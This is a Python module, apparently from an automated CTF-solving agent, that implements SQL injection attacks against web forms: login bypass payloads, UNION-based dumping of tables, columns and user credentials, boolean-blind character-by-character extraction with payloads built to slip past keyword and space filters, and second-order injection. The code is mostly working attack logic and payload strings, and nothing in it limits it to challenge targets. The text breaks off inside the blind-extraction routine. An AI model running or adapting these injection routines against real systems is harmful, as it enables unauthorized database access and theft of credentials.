"""SQLi strategy executor extracted from ctf_dispatcher.py.

P5 / sixteenth cut: the SQLi strategy cluster (5 methods, ~494 lines) is
physically moved out of CTFTaskDispatcher into a behaviour-preserving
mixin — unicode numeric-form bypass, auth-form SQLi bypass, sqlmap driver,
generic GET-parameter stacked-query SQLi, and the local-challenge
compose-logs credential pivot.

The only top-level constant the cluster touches, ``_SQLI_AUTH_BYPASS_PAYLOADS``,
is used solely here, so it travels with the cluster into this module (no
sinking to dispatcher_helpers). Every other module-level symbol is already
exported from acyclic modules: the form / sqlmap / local-challenge helpers
from ``dispatcher_helpers``, ``find_auth_form`` from ``ctf_planner``,
``_ChainOutcome`` from ``chains.base``; ``run_sqlmap`` stays a method-local
dynamic import. All ``self.*`` access resolves at runtime via the MRO of the
dispatcher that mixes this in — including the shared ``_submit_form_request``
(kept on the dispatcher in the fourteenth cut), ``_extract_flag`` /
``_extract_php_var_dump_strings`` (FlagParserMixin), ``_observe_flag``
(FlagObserverMixin), ``_store_note`` / ``_store_secret_note``
(NoteStoreMixin), ``_resolve_registered_local_challenge_paths``
(AuditInfraMixin) and the dispatcher-resident ``_scan_and_store`` /
``_emit`` / ``_recent_local_source_hint_routes`` / ``_fetch_admin_with_sid``.
Call sites unchanged. Pure code relocation, near-zero risk.
"""

from __future__ import annotations

import json
import re
from typing import Any
from urllib.parse import urljoin, urlparse

from .chains.base import _ChainOutcome
from .ctf_planner import find_auth_form
from .dispatcher_helpers import (
    _base_target,
    _build_sqlmap_target_from_form,
    _docker_compose_logs_command,
    _extract_admin_password_from_logs,
    _extract_local_challenge_root,
    _extract_sid_from_login_response,
    _looks_like_successful_auth_change,
    _pick_form_field,
    _quote_sql_identifier,
    _resolve_auth_login_url,
    _resolve_compose_file,
    _with_query,
)

_SQLI_AUTH_BYPASS_PAYLOADS = (
    "1' or 1=1#",
    "admin' or '1'='1' -- -",
    "' or 1=1#",
)

# UNION-based extraction (LoveSQL-class login forms whose flag lives in a table
# column, not shown on login). Every dumped value is wrapped in this marker so it
# can be regex-recovered from any page template regardless of surrounding HTML.
_SQLI_UNION_MARKER = "<<FHU>>"
_SQLI_UNION_MARKER_HEX = "0x3c3c4648553e3e"  # hex("<<FHU>>")
_SQLI_UNION_MAX_COLUMNS = 8
_SQLI_UNION_SENTINEL_BASE = 918200  # distinctive ints unlikely to occur naturally

# ---------------------------------------------------------------------------
# Boolean-blind extraction with WAF-evasion payload synthesis
# ---------------------------------------------------------------------------
# sqlmap's payload templates lean on keyword+space structure that a
# keyword-and-space blacklist (HackWorld-class WAF) rejects, so sqlmap
# "does not seem to be injectable" even though the parameter is. This native
# extractor synthesises keyword-lean, space-free boolean oracles — ``&&``/``||``
# logic instead of ``and``/``or``, parenthesised sub-queries instead of
# space-separated clauses, ``/**/`` or raw control-char separators, and
# ``substr``/``mid`` + ``ascii``/``ord`` alternates — then reconstructs data one
# character at a time via a page-diff oracle. Unlike UNION extraction it needs
# no reflected column, and unlike the sqlmap path it needs no external binary.
_BLIND_SEPARATORS = (" ", "/**/", "\n", "\t", "\x0b", "\x0c", "\r")
_BLIND_CONTEXTS = ("numeric", "string_single", "string_double", "conditional_if")
# ``conditional_if`` synthesises no logic operator, so the separator flavour is
# irrelevant — probing it against every separator would only burn oracle budget.
_BLIND_SEP_INDEPENDENT_CONTEXTS = frozenset({"conditional_if"})
_BLIND_PRINTABLE_LO = 31   # exclusive lower bound for a binary search over 32..126
_BLIND_PRINTABLE_HI = 127  # exclusive upper bound
_BLIND_MAX_ORACLE_PROBES = 64
_BLIND_MAX_EXTRACT_REQUESTS = 1400
_BLIND_MAX_STR_LEN = 96
_BLIND_TABLES_EXPR = (
    "select(group_concat(table_name))from(information_schema.tables)"
    "where(table_schema=database())"
)
# CTF flag rows overwhelmingly live in an obviously-named table/column. Probing
# these directly reaches the flag in a single short extraction and side-steps the
# ``information_schema`` walk, which group_concats *every* table (capped at
# ``_BLIND_MAX_STR_LEN`` and ordered by storage): on a large shared database such
# as BUUCTF's ``ctftraining`` the ``flag`` table falls outside the extracted
# window and the walk exhausts its request budget before ever reaching it. Each
# expression is a self-contained, whitespace-free scalar sub-select (``from(x)``
# parenthesised in place of a space) so it survives a space/keyword-blacklisting
# WAF; a non-existent table/column errors the sub-query, the length probe returns
# 0 (a handful of requests), and the next candidate is tried.
_BLIND_DIRECT_FLAG_EXPRS = (
    "select(group_concat(flag))from(flag)",
    "select(group_concat(flag))from(flags)",
    "select(group_concat(flag))from(ctf)",
    "select(group_concat(value))from(flag)",
    "select(group_concat(content))from(flag)",
    "select(group_concat(flag))from(secret)",
    "select(group_concat(secret))from(secret)",
)

# ---------------------------------------------------------------------------
# Second-order SQLi: plant in one request, trigger in a later one
# ---------------------------------------------------------------------------
# The injectable value is not used by the query that stores it — it is persisted
# (a registration username, an order note, a comment) and only later
# concatenated verbatim into a *different* query on a trigger endpoint. sqlmap
# and every first-order strategy probe the store request, see the value echoed
# back safely, and conclude "not injectable" — they never reach the deferred
# sink. This extractor plants a UNION payload in the stored field, hits the
# trigger endpoint where the stored value is re-queried, and reads the reflected
# result. Each probe is a two-request (store → trigger) cycle, so it is bounded
# tightly and gated on a recognized store→reuse shape (never fires blind).
_SECOND_ORDER_MAX_COLUMNS = 6
_SECOND_ORDER_REQUEST_BUDGET = 140
_SECOND_ORDER_SENTINEL = "FH2ND0RDER"
_SECOND_ORDER_SENTINEL_HEX = "0x" + _SECOND_ORDER_SENTINEL.encode().hex()
# Compact flag-location repertoire tried at the confirmed column layout. Each
# expression is self-contained (parenthesised sub-select) and whitespace-free
# (``/**/`` separators) so it survives both the second query's string context
# and any incidental space filtering.
_SECOND_ORDER_FLAG_EXPRS = (
    "(select/**/group_concat(flag)/**/from/**/flag)",
    "(select/**/group_concat(flag)/**/from/**/flags)",
    "(select/**/flag/**/from/**/flag/**/limit/**/1)",
    "(select/**/group_concat(concat_ws(0x7e,username,password))/**/from/**/users)",
    "(select/**/group_concat(concat_ws(0x7e,username,password))/**/from/**/admin)",
    "(select/**/group_concat(table_name)/**/from/**/information_schema.tables"
    "/**/where/**/table_schema=database())",
)


def _second_order_union_value(
    nonce: str,
    expr: str,
    column_count: int,
    position: int,
    separator: str,
) -> str:
    """Build a stored value that becomes a UNION at the trigger query.

    ``nonce'`` closes the string the trigger query wraps it in; the trailing
    ``#`` comments out that query's own closing quote / suffix. ``nonce`` keeps
    each stored row unique so a UNIQUE-key store (registration) never rejects it.
    """
    columns = [
        expr if index == position else str(index)
        for index in range(1, column_count + 1)
    ]
    return f"{nonce}'{separator}union{separator}select{separator}{','.join(columns)}#"


def _blind_normalize_body(body: str) -> str:
    """Collapse volatile bits so a TRUE page and a FALSE page compare stably.

    Digit runs are masked (an echoed id must not read as a content difference)
    and whitespace collapsed. Two responses with the same normalized form are
    treated as the same boolean outcome.
    """
    return " ".join(re.sub(r"\d+", "#", body or "").split())


def _blind_wrap_payload(context: str, condition: str, sep: str) -> str:
    """Wrap a space-free boolean ``condition`` into an injection for ``context``.

    ``numeric`` closes nothing (``1&&(cond)``); the string contexts close a
    quote and comment out the trailing quote (``1'&&(cond)#``). ``sep`` is the
    separator flavour (space, ``/**/`` or a raw control char) inserted around the
    logic operator so a space-blacklist can be side-stepped.

    ``conditional_if`` uses no logic operator at all: it makes the whole numeric
    parameter ``if((cond),1,0)`` so the row resolves to the valid baseline id
    when the condition holds and to a non-existent id otherwise. This is the
    canonical bypass for a WAF that blacklists ``&&``/``and``/``or`` outright
    (e.g. HackWorld) where every conjunction-style oracle is rejected wholesale.
    """
    if context == "conditional_if":
        return f"if(({condition}),1,0)"
    body = f"{sep}&&{sep}({condition}){sep}"
    if context == "numeric":
        return f"1{body}"
    if context == "string_single":
        return f"1'{body}#"
    if context == "string_double":
        return f'1"{body}#'
    return condition


def _blind_substr_expr(expr: str, pos: int, *, substr_fn: str, comma: bool) -> str:
    """A space-free single-character slice of ``expr`` at 1-indexed ``pos``.

    ``comma=True`` uses ``substr(x,pos,1)``; ``comma=False`` uses the
    comma-free ANSI form ``substr(x from pos for 1)`` for comma-blacklists.
    """
    if comma:
        return f"{substr_fn}(({expr}),{pos},1)"
    return f"{substr_fn}(({expr})from({pos})for(1))"


def _blind_char_gt(
    expr: str,
    pos: int,
    mid: int,
    *,
    substr_fn: str = "substr",
    ascii_fn: str = "ascii",
    comma: bool = True,
) -> str:
    """Condition ``ascii(substr(expr,pos,1)) > mid`` (space-free)."""
    return f"{ascii_fn}({_blind_substr_expr(expr, pos, substr_fn=substr_fn, comma=comma)})>{mid}"


def _blind_len_gt(expr: str, n: int) -> str:
    """Condition ``length(expr) > n`` (space-free)."""
    return f"length(({expr}))>{n}"


class SQLiExecutorMixin:
    """Unicode/auth/sqlmap/generic SQLi strategies and the local-challenge log pivot."""

    async def _run_unicode_numeric_form_bypass_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        forms = list(page_features.get("forms") or [])
        candidate_form = None
        for form in forms:
            if not isinstance(form, dict):
                continue
            input_names = {
                str(item.get("name") or "").strip().lower()
                for item in (form.get("inputs") or [])
                if isinstance(item, dict) and str(item.get("name") or "").strip()
            }
            action = str(form.get("action") or "").strip().lower()
            if {"id", "price"}.issubset(input_names) and ("/charge" in action or action.endswith("charge")):
                candidate_form = form
                break

        if candidate_form is None:
            for form in forms:
                if not isinstance(form, dict):
                    continue
                input_names = {
                    str(item.get("name") or "").strip().lower()
                    for item in (form.get("inputs") or [])
                    if isinstance(item, dict) and str(item.get("name") or "").strip()
                }
                if {"id", "price"}.issubset(input_names):
                    candidate_form = form
                    break

        if candidate_form is None:
            return _ChainOutcome(progress=False, reason="unicode numeric bypass: purchase form not found")

        strategy_kind = "unicode_numeric_form_bypass"
        action_url = str(candidate_form.get("action") or "").strip() or target
        if not action_url:
            action_url = target
        action_url = urljoin(target if target.endswith("/") else target + "/", action_url)

        baseline_fields = {"id": "4", "price": "1"}
        baseline_resp, _ = await self._submit_form_request(target, candidate_form, baseline_fields)
        baseline_body = str((baseline_resp or {}).get("body") or "")
        baseline_status = int((baseline_resp or {}).get("status_code") or 0)
        await self._scan_and_store(baseline_body, action_url, evidence_source="http-response", page_features=page_features)
        if self.state is not None and baseline_body:
            self.state.add_observation(
                "unicode_numeric_baseline",
                baseline_body[:240],
                source=strategy_kind,
                metadata={
                    "strategy_kind": strategy_kind,
                    "url": action_url,
                    "status_code": baseline_status,
                    "fields": dict(baseline_fields),
                },
            )

        progress = bool(baseline_body)
        failure_markers = ("not enough money", "only one char", "one char", "余额", "money")
        if baseline_body and any(marker in baseline_body.lower() for marker in failure_markers):
            progress = True

        candidate_payloads = ("万", "萬", "፼", "ↈ")
        reasons: list[str] = []
        baseline_lower = baseline_body.lower()
        for payload in candidate_payloads:
            attempt_fields = {"id": "4", "price": payload}
            response, request_url = await self._submit_form_request(
                target,
                candidate_form,
                attempt_fields,
            )
            body = str((response or {}).get("body") or "")
            status_code = int((response or {}).get("status_code") or 0)
            await self._scan_and_store(body, request_url, evidence_source="http-response", page_features=page_features)
            if self.state is not None and body:
                self.state.add_observation(
                    "unicode_numeric_probe",
                    body[:240],
                    source=strategy_kind,
                    metadata={
                        "strategy_kind": strategy_kind,
                        "url": request_url,
                        "status_code": status_code,
                        "fields": dict(attempt_fields),
                        "payload": payload,
                    },
                )

            self._emit(f"[CTF dispatcher] unicode numeric probe price={payload!r} -> {request_url}")

            if extracted_flag := self._extract_flag(body):
                verification = await self._observe_flag(
                    extracted_flag,
                    target,
                    evidence_source="http-response",
                    rationale=f"unicode numeric form bypass via price={payload}",
                    evidence_url=request_url,
                    evidence_snippet=body[:240],
                    strategy_kind=strategy_kind,
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"unicode numeric form bypass via price={payload}",
                    )
                progress = True
                reasons.append(f"unicode numeric payload {payload} produced {verification.decision} flag")
                continue

            lowered = body.lower()
            if body and lowered != baseline_lower:
                progress = True
                reasons.append(f"unicode numeric payload {payload} changed response")

        return _ChainOutcome(
            progress=progress,
            reason="; ".join(reasons) if reasons else "unicode numeric payloads exhausted",
        )

    async def _attempt_auth_form_sqli(
        self,
        target: str,
        auth_form: dict[str, Any],
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        username_field = _pick_form_field(auth_form, "username")
        password_field = _pick_form_field(auth_form, "password")
        if not username_field or not password_field:
            return _ChainOutcome(progress=False, reason="auth form fields incomplete")

        baseline_fields = {
            username_field: "ctf_probe_user",
            password_field: "ctf_probe_pass",
        }
        baseline_resp, _ = await self._submit_form_request(
            target, auth_form, baseline_fields
        )
        baseline_body = str((baseline_resp or {}).get("body") or "")
        await self._scan_and_store(baseline_body, target, evidence_source="http-response")
        progress = bool(baseline_body)
        reasons: list[str] = []

        for payload in _SQLI_AUTH_BYPASS_PAYLOADS:
            attempt_fields = {
                username_field: payload,
                password_field: "1",
            }
            response, request_url = await self._submit_form_request(
                target, auth_form, attempt_fields
            )
            body = str((response or {}).get("body") or "")
            await self._scan_and_store(body, target, evidence_source="http-response")
            self._emit(
                f"[CTF dispatcher] SQLi auth probe {username_field}={payload!r} -> {request_url}"
            )
            extracted_flag = self._extract_flag(body)
            if extracted_flag:
                verification = await self._observe_flag(
                    extracted_flag,
                    target,
                    evidence_source="http-response",
                    rationale="auth form SQLi bypass",
                    evidence_url=request_url,
                    evidence_snippet=body[:240],
                    strategy_kind="auth_form_sqli",
                )
                # Mirror _attempt_generic_param_sqli: surface the flag on both
                # "verified" and "runtime" decisions. A live-exploit flag that
                # literally appears in the auth-bypass response is a real
                # near-solve; dropping it on "runtime" (as the old `continue`
                # did) loses the win for remote CTF instances that the verifier
                # cannot auto-verify without a prior platform submit.
                if verification.decision in {"verified", "runtime"}:
                    await self._store_note(
                        key="ctf_sqli_auth_bypass",
                        value=f"auth form bypass succeeded via {username_field}={payload}",
                        category="vulnerability",
                        target=urlparse(target).netloc or target,
                        url=request_url,
                        weaknesses=[
                            {
                                "id": "sqli-auth-bypass",
                                "description": "Authentication form accepted a SQL injection login bypass payload.",
                            }
                        ],
                    )
                    # verified ⇒ unconditional solve; runtime ⇒ short-circuit the
                    # sequence and surface the flag (blackboard make_goal reads it from
                    # state.runtime_flags), but mark it unverified so the terminal
                    # contract routes it to wait_for_verification, not a claimed win.
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason="auth form SQLi bypass",
                        verified=verification.decision == "verified",
                    )
                if verification.decision == "candidate":
                    progress = True
                    reasons.append("auth form produced candidate flag")
                    continue

            if _looks_like_successful_auth_change(response, baseline_resp):
                await self._store_note(
                    key="ctf_sqli_auth_signal",
                    value=f"response diverged for payload {payload}",
                    category="finding",
                    target=urlparse(target).netloc or target,
                    url=request_url,
                )
                return _ChainOutcome(
                    progress=True,
                    reason="auth form response changed under SQLi payload",
                )

        fallback_reason = "auth-form probes exhausted"
        if reasons:
            fallback_reason = "; ".join(reasons + [fallback_reason])
        return _ChainOutcome(progress=progress, reason=fallback_reason)

    async def _attempt_auth_form_union_sqli(
        self,
        target: str,
        auth_form: dict[str, Any],
    ) -> _ChainOutcome:
        """UNION-based extraction on a login form (LoveSQL-class).

        ``_attempt_auth_form_sqli`` only *logs in* — for challenges whose flag lives
        in a table column (never shown on the login page) the flag is recovered by a
        ``UNION SELECT`` that reflects a dumped value into the response. This is the
        missing POST-login UNION extraction vector: the bypass strategy does login,
        ``generic_param_sqli`` does GET-form stacked queries (``handler read``), and
        neither dumps a login form's database via UNION. The live LoveSQL stress run
        exposed the gap — 24 steps, zero UNION payloads, unsolved.

        Deterministic bounded schema walk: discover the UNION column count and a
        reflected position, then dump tables -> columns -> row data via
        ``group_concat``, wrapping every extracted value in a distinctive marker so it
        can be regex-recovered from any page template. Each blob is flag-scanned; a
        verified/runtime flag is surfaced exactly like the bypass strategy (returned on
        "runtime" too, per efd6188), with ``strategy_kind`` set for memory attribution.
        """
        self.tool_guard.require(["http_request"])
        username_field = _pick_form_field(auth_form, "username")
        password_field = _pick_form_field(auth_form, "password")
        if not username_field:
            return _ChainOutcome(
                progress=False, reason="auth form union: no injectable username field"
            )

        progress = False
        reasons: list[str] = []

        async def _submit(payload: str) -> tuple[str, str]:
            fields = {username_field: payload}
            if password_field:
                fields[password_field] = "1"
            response, url = await self._submit_form_request(target, auth_form, fields)
            body = str((response or {}).get("body") or "")
            await self._scan_and_store(body, url, evidence_source="http-response")
            return body, url

        async def _check_flag(body: str, url: str, note: str) -> _ChainOutcome | None:
            extracted = self._extract_flag(body)
            if not extracted:
                return None
            verification = await self._observe_flag(
                extracted,
                target,
                evidence_source="http-response",
                rationale=f"auth form UNION SQLi: {note}",
                evidence_url=url,
                evidence_snippet=body[:240],
                strategy_kind="auth_form_union_sqli",
            )
            if verification.decision in {"verified", "runtime"}:
                await self._store_note(
                    key="ctf_sqli_union_extract",
                    value=f"UNION extraction recovered flag via {username_field} ({note})",
                    category="vulnerability",
                    target=urlparse(target).netloc or target,
                    url=url,
                    weaknesses=[
                        {
                            "id": "sqli-union",
                            "description": "UNION-based SQL injection recovered database contents.",
                        }
                    ],
                )
                return _ChainOutcome(
                    progress=True,
                    flag=verification.flag,
                    reason="auth form UNION SQLi",
                    verified=verification.decision == "verified",
                )
            return None

        # 1) Column count + reflected positions: grow the SELECT list until the row's
        #    integer sentinels surface in the response (a correct column count no longer
        #    errors, and the union row is rendered where the login result would be).
        columns = 0
        reflected: list[int] = []
        for n in range(2, _SQLI_UNION_MAX_COLUMNS + 1):
            sentinels = [str(_SQLI_UNION_SENTINEL_BASE + i) for i in range(n)]
            body, _url = await _submit("-1' union select " + ",".join(sentinels) + "#")
            hit = [i + 1 for i, s in enumerate(sentinels) if s in body]
            if hit:
                columns, reflected, progress = n, hit, True
                reasons.append(f"union column count = {n}, reflected positions {hit}")
                break

        if not columns or not reflected:
            return _ChainOutcome(
                progress=progress,
                reason="; ".join(reasons + ["auth form union: no reflected UNION column found"]),
            )

        pos = reflected[0]  # 1-indexed reflected position we hijack for extraction

        def _build(expr: str) -> str:
            wrapped = f"concat({_SQLI_UNION_MARKER_HEX},({expr}),{_SQLI_UNION_MARKER_HEX})"
            cells = [
                wrapped if (i + 1) == pos else str(_SQLI_UNION_SENTINEL_BASE + i)
                for i in range(columns)
            ]
            return "-1' union select " + ",".join(cells) + "#"

        marker = re.escape(_SQLI_UNION_MARKER)

        def _extract_marked(body: str) -> str:
            match = re.search(marker + r"(.*?)" + marker, body, re.DOTALL)
            return match.group(1) if match else ""

        # 2) Dump the current database's tables.
        body, url = await _submit(
            _build(
                "select group_concat(table_name) from information_schema.tables "
                "where table_schema=database()"
            )
        )
        if hit_outcome := await _check_flag(body, url, "table dump"):
            return hit_outcome
        tables = [
            t
            for t in _extract_marked(body).split(",")
            if re.fullmatch(r"[A-Za-z0-9_]+", t or "")
        ]
        if tables:
            progress = True
            reasons.append(f"union dumped tables: {', '.join(tables[:4])}")
            await self._store_note(
                key="ctf_sqli_union_tables",
                value=json.dumps({"tables": tables[:10]}, ensure_ascii=False),
                category="finding",
                target=urlparse(target).netloc or target,
                url=url,
            )

        def _table_rank(name: str) -> tuple[bool, str]:
            low = name.lower()
            interesting = any(
                tok in low
                for tok in ("flag", "key", "secret", "love", "user", "ctf", "sql", "geek")
            )
            return (not interesting, name)

        # 3+4) Per table: dump its columns, then group_concat all columns of every row
        #       and flag-scan the blob.
        for table in sorted(tables, key=_table_rank)[:4]:
            table_hex = "0x" + table.encode().hex()
            body, url = await _submit(
                _build(
                    "select group_concat(column_name) from information_schema.columns "
                    f"where table_schema=database() and table_name={table_hex}"
                )
            )
            if hit_outcome := await _check_flag(body, url, f"column dump {table}"):
                return hit_outcome
            cols = [
                c
                for c in _extract_marked(body).split(",")
                if re.fullmatch(r"[A-Za-z0-9_]+", c or "")
            ]
            if not cols:
                continue
            concat_cols = ",".join(
                f"ifnull({_quote_sql_identifier(c)},0x20)" for c in cols
            )
            body, url = await _submit(
                _build(
                    f"select group_concat(concat_ws(0x7e,{concat_cols})) "
                    f"from {_quote_sql_identifier(table)}"
                )
            )
            if hit_outcome := await _check_flag(body, url, f"row dump {table}"):
                return hit_outcome
            progress = True
            reasons.append(f"union dumped rows from {table}")

        fallback = "auth form union: extraction exhausted without flag"
        return _ChainOutcome(
            progress=progress,
            reason="; ".join(reasons + [fallback]) if reasons else fallback,
        )

    # ------------------------------------------------------------------ #
    # Boolean-blind extraction (WAF-evasion synthesis)                    #
    # ------------------------------------------------------------------ #
    def _collect_blind_injection_points(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> list[dict[str, Any]]:
        """Enumerate submittable form fields to try as blind-injection points.

        Any form (GET or POST) with a named, non-decorative input is a candidate;
        an auth form's username field is tried first. Each point records the form
        and field so ``_submit_form_request`` can drive it uniformly.
        """
        points: list[dict[str, Any]] = []
        seen: set[tuple[str, str]] = set()
        forms = [f for f in (page_features.get("forms") or []) if isinstance(f, dict)]

        def _add(form: dict[str, Any], field: str, base: str) -> None:
            key = (str(form.get("action") or ""), field)
            if field and key not in seen:
                seen.add(key)
                points.append({"form": form, "field": field, "base": base or "1"})

        auth_form = find_auth_form(forms)
        if auth_form is not None:
            username_field = _pick_form_field(auth_form, "username")
            if username_field:
                _add(auth_form, username_field, "1")

        for form in forms:
            for item in form.get("inputs") or []:
                if not isinstance(item, dict):
                    continue
                name = str(item.get("name") or "").strip()
                field_type = str(item.get("type") or "text").strip().lower()
                if not name or field_type in {"submit", "button", "image", "reset", "hidden", "file"}:
                    continue
                _add(form, name, str(item.get("value") or "").strip() or "1")

        return points[:6]

    async def _blind_raw_submit(
        self,
        target: str,
        point: dict[str, Any],
        value: str,
        budget: dict[str, int],
    ) -> str:
        """Submit ``value`` into one field and return the response body.

        Increments the shared request budget and opportunistically scans the body
        so an incidental flag is still captured.
        """
        budget["n"] = budget.get("n", 0) + 1
        response, url = await self._submit_form_request(target, point["form"], {point["field"]: value})
        body = str((response or {}).get("body") or "")
        await self._scan_and_store(body, url, evidence_source="http-response")
        return body

    async def _establish_blind_oracle(
        self,
        target: str,
        points: list[dict[str, Any]],
        budget: dict[str, int],
    ) -> dict[str, Any] | None:
        """Find a ``(point, context, separator)`` whose TRUE/FALSE pages differ.

        A working boolean oracle is one where the space-free ``&&(1=1)`` payload
        renders like the valid baseline while ``&&(1=2)`` renders differently —
        the signal that the field is boolean-blind injectable in that context.
        """
        for point in points:
            base_sig = _blind_normalize_body(await self._blind_raw_submit(target, point, str(point["base"]), budget))
            for context in _BLIND_CONTEXTS:
                for sep in _BLIND_SEPARATORS:
                    if context in _BLIND_SEP_INDEPENDENT_CONTEXTS and sep != _BLIND_SEPARATORS[0]:
                        continue
                    if budget.get("n", 0) >= _BLIND_MAX_ORACLE_PROBES:
                        return None
                    true_body = await self._blind_raw_submit(
                        target, point, _blind_wrap_payload(context, "1=1", sep), budget
                    )
                    false_body = await self._blind_raw_submit(
                        target, point, _blind_wrap_payload(context, "1=2", sep), budget
                    )
                    true_sig = _blind_normalize_body(true_body)
                    false_sig = _blind_normalize_body(false_body)
                    if true_sig and true_sig != false_sig and true_sig == base_sig:
                        return {
                            "target": target,
                            "point": point,
                            "context": context,
                            "sep": sep,
                            "true_sig": true_sig,
                            "substr_fn": "substr",
                            "ascii_fn": "ascii",
                            "comma": True,
                        }
        return None

    async def _blind_oracle_true(
        self,
        oracle: dict[str, Any],
        condition: str,
        budget: dict[str, int],
    ) -> bool:
        """True iff the boolean ``condition`` holds on the target (page-diff)."""
        payload = _blind_wrap_payload(oracle["context"], condition, oracle["sep"])
        body = await self._blind_raw_submit(oracle["target"], oracle["point"], payload, budget)
        return _blind_normalize_body(body) == oracle["true_sig"]

    async def _blind_probe_length(
        self,
        oracle: dict[str, Any],
        expr: str,
        budget: dict[str, int],
        max_len: int,
    ) -> int:
        """Binary-search ``length(expr)`` in ``[0, max_len]`` (``-1`` if over budget)."""
        lo, hi = 0, max_len
        while lo < hi:
            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
                return -1
            mid = (lo + hi) // 2
            if await self._blind_oracle_true(oracle, _blind_len_gt(expr, mid), budget):
                lo = mid + 1
            else:
                hi = mid
        return lo

    async def _blind_probe_char(
        self,
        oracle: dict[str, Any],
        expr: str,
        pos: int,
        budget: dict[str, int],
    ) -> str | None:
        """Binary-search the printable char of ``expr`` at 1-indexed ``pos``."""
        lo, hi = _BLIND_PRINTABLE_LO, _BLIND_PRINTABLE_HI  # value ∈ (lo, hi)
        while hi - lo > 1:
            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
                return None
            mid = (lo + hi) // 2
            condition = _blind_char_gt(
                expr,
                pos,
                mid,
                substr_fn=oracle["substr_fn"],
                ascii_fn=oracle["ascii_fn"],
                comma=oracle["comma"],
            )
            if await self._blind_oracle_true(oracle, condition, budget):
                lo = mid
            else:
                hi = mid
        return chr(hi)

    async def _blind_extract_string(
        self,
        oracle: dict[str, Any],
        expr: str,
        budget: dict[str, int],
        *,
        max_len: int = _BLIND_MAX_STR_LEN,
    ) -> str:
        """Reconstruct ``expr`` one character at a time via the boolean oracle."""
        length = await self._blind_probe_length(oracle, expr, budget, max_len)
        if length <= 0:
            return ""
        chars: list[str] = []
        for pos in range(1, length + 1):
            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
                break
            char = await self._blind_probe_char(oracle, expr, pos, budget)
            if char is None:
                break
            chars.append(char)
        return "".join(chars)

    async def _blind_scan_for_flag(
        self,
        target: str,
        blob: str,
        note: str,
    ) -> _ChainOutcome | None:
        """Flag-scan a reconstructed blob; surface a verified/runtime flag."""
        extracted = self._extract_flag(blob or "")
        if not extracted:
            return None
        verification = await self._observe_flag(
            extracted,
            target,
            # The flag is recovered from live HTTP-response differences (the
            # boolean page-diff oracle), so it is a runtime-observed signal —
            # same evidence class as the UNION/auth SQLi strategies.
            evidence_source="http-response",
            rationale=f"blind SQLi: {note}",
            evidence_url=target,
            evidence_snippet=(blob or "")[:240],
            strategy_kind="blind_sqli",
        )
        if verification.decision in {"verified", "runtime"}:
            await self._store_note(
                key="ctf_blind_sqli_extract",
                value=f"boolean-blind extraction recovered flag ({note})",
                category="vulnerability",
                target=urlparse(target).netloc or target,
                url=target,
                weaknesses=[
                    {
                        "id": "sqli-boolean-blind",
                        "description": "Boolean-blind SQL injection reconstructed database contents.",
                    }
                ],
            )
            return _ChainOutcome(
                progress=True,
                flag=verification.flag,
                reason=f"blind SQLi {note}",
                verified=verification.decision == "verified",
            )
        return None

    async def _attempt_blind_sqli(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        """Native boolean-blind SQLi extractor with WAF-evasion synthesis.

        The sqlmap path fails on keyword+space blacklists (HackWorld-class) whose
        WAF rejects sqlmap's payload templates outright, so the parameter reads as
        "not injectable" even though it is. This extractor synthesises keyword-lean,
        space-free boolean oracles (``&&`` conjunction or ``if((cond),1,0)``
        conditional-response for WAFs that blacklist ``&&``/``and`` outright,
        parenthesised sub-queries, ``/**/``/control-char separators,
        ``substr``/``mid`` + ``ascii``/``ord`` alternates), establishes a page-diff
        oracle, then reconstructs data one
        character at a time — needing neither a reflected UNION column nor an
        external binary. Extraction order: ``database()`` (also calibrating the
        function flavour) -> a CTF fast-path over the obvious flag locations
        (``flag``.``flag`` etc.) -> a bounded ``information_schema`` walk (tables
        -> columns -> row blob) as the fallback, flag-scanning every reconstructed
        string. The fast-path is what reaches a HackWorld-class ``flag`` table
        inside the request budget on a large shared database where the generic
        walk would truncate and run dry first. A hard request budget caps cost;
        the cheap oracle phase bails fast on non-blind targets.
        """
        self.tool_guard.require(["http_request"])
        points = self._collect_blind_injection_points(target, page_features)
        if not points:
            return _ChainOutcome(progress=False, reason="blind sqli: no injectable submission surface")

        budget: dict[str, int] = {"n": 0}
        oracle = await self._establish_blind_oracle(target, points, budget)
        if oracle is None:
            return _ChainOutcome(
                progress=False,
                reason="blind sqli: no boolean oracle (not blind-injectable or filtered)",
            )

        host = urlparse(target).netloc or target
        reasons = [
            f"boolean-blind oracle on field '{oracle['point']['field']}' "
            f"(context={oracle['context']}, sep={oracle['sep']!r})"
        ]
        await self._store_note(
            key="ctf_blind_sqli_confirmed",
            value=(
                f"field={oracle['point']['field']} context={oracle['context']} "
                f"separator={oracle['sep']!r} — WAF-evasion boolean-blind injection"
            ),
            category="vulnerability",
            target=host,
            url=target,
        )

        # Calibrate the substr/ascii/comma flavour on database() (short), then
        # reuse the winning combo for the rest of the walk.
        db = ""
        for substr_fn, ascii_fn, comma in (
            ("substr", "ascii", True),
            ("mid", "ascii", True),
            ("substr", "ord", True),
            ("substr", "ascii", False),
            ("mid", "ord", False),
        ):
            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
                break
            oracle["substr_fn"], oracle["ascii_fn"], oracle["comma"] = substr_fn, ascii_fn, comma
            candidate = await self._blind_extract_string(oracle, "database()", budget, max_len=48)
            if candidate and candidate.isprintable():
                db = candidate
                break
        else:
            oracle["substr_fn"], oracle["ascii_fn"], oracle["comma"] = "substr", "ascii", True

        if db:
            reasons.append(f"current database='{db}'")
            if hit := await self._blind_scan_for_flag(target, db, "database()"):
                return hit

        # CTF fast-path: try the obvious flag locations directly before the
        # expensive, truncation-prone information_schema walk. This reaches a
        # ``flag``.``flag`` row (HackWorld-class) inside the request budget even on
        # a large shared database where the generic walk would run dry first.
        for expr in _BLIND_DIRECT_FLAG_EXPRS:
            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
                break
